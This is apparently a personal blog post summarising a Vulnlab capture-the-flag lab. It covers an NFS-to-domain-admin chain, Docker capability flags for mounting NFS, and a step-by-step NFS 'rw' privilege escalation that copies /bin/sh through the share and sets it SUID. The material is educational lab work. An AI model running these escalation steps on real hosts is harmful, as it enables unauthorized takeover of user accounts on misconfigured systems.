+++
title = '[Vulnlab] Hybrid - Mounting an nfs share inside Docker and other Adventures'
date = 2024-10-12T00:43:42+02:00
draft = false
tags = ['pentesting']
+++

[![Proof](/images/vulnalb_hybrid/banner.png)](https://api.vulnlab.com/api/v1/share?id=74caee57-0676-4d10-bfcc-9010a57dd7ac)


# Summary
If you came for a write-up for this challenge. Sorry, here is just a summary,
since I'm lazy.
However, I can offer a short fun story on how to mount an NFS Share inside docker.

The challenge consists of two hosts:
* `MAIL01` - Linux host with Webmail
* `DC01` - Windows Domain Controller
## Mail01
1. Mount an NFS Share for credentials
2. Use credentials to log in to Roundcube webmail
3. Public Exploit leads to reverse shell
4. Exploit NFS `rw` privilege to take over User â†’ user.txt
5. Find Keytab file that contains NTLM-Hash of `MAIL01`
## DC01
1. Abuse ESC1 for Domain Admin


# 1. A tale of mounting NFS in Docker
So I was trying to solve the challenge, and suddenly I found an NFS share
that allowed anyone (including evil hackers like me) to mount it.

```bash
showmount -e $IP
Export list for 10.10.255.86:
/opt/share *
```
The problem? I'm using [Exegol](https://exegol.readthedocs.io) which is a docker container for pentesting.
And well, when you try to mount a share you get this:
```bash
mkdir share
mount -t nfs $IP:/opt/share share -o nolock 
```

![Mount problems](/images/vulnlab_hybrid/problem.png)

> mount.nfs: Operation not permitted

Turns out that mounting requires some capabilities that a normal docker container doesn't have for security purposes.

## YOLO approach `--privileged` 
The easiest approach would be just to use the `--privileged` flag and not think about it.

Yes, that works... and is an awful idea. Any malicious script that we use
during the engagement has can just take over the host system.
[Hacktricks link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-privileged)

AFAIK this is the only way to make mounting possible in Exegol.

## More nuanced approach with Capabilities and apparmor

We need two things to be able to mount:
* `SYS_ADMIN`
* `apparmor:unconfirmed`

Apparmor protects against malicious system calls, such as mount, so
we need to be able to handle that.

Example with Ubuntu:
```bash
docker run --rm --cap-add SYS_ADMIN \
--security-opt apparmor:unconfined \
 -it ubuntu /bin/bash
```


## Bonus
In case we want to create a pentesting docker with a VPN tunnel we need the following flags to do it:

* Capacity `NET_ADMIN`
* Device `/dev/net/tun`

Example with Ubuntu:
```bash
docker run --rm --cap-add NET_ADMIN \
--device /dev/net/tun \
-it ubuntu /bin/bash
```

# 4. NFS Privilege escalation
This was part of the challenge and it involved so many steps that I need to write it down.

Basically if you have code execution on the remote machine you can do the following.

1. Check the configuration in `/etc/exports`
**Vulnerable configurations**
* `no_root_squash`
* `rw`

## Case 1 - no_root_squash
Just copy SUID binary

## Case 2 - just rw - take over non-root user
> Create SUID binary of specific user (root not possible)

1. Recreate user locally
```bash
sudo useradd [name] -u [uid of target] -g sudo
sudo passwd [name]
```
2. Mount share again
```bash
sudo mount -t nfs $(<DOMAIN):[target] share -o nolock
```
3. Set SUID of bin/sh
On victim
```bash
cp /bin/sh .
```
On Host
```bash
cp share/sh .
```
On victim
```bash
rm sh
```
On Host
```bash
cp sh share
chmod 4755 share/sh
```

Win on victim
```bash
./sh -p
```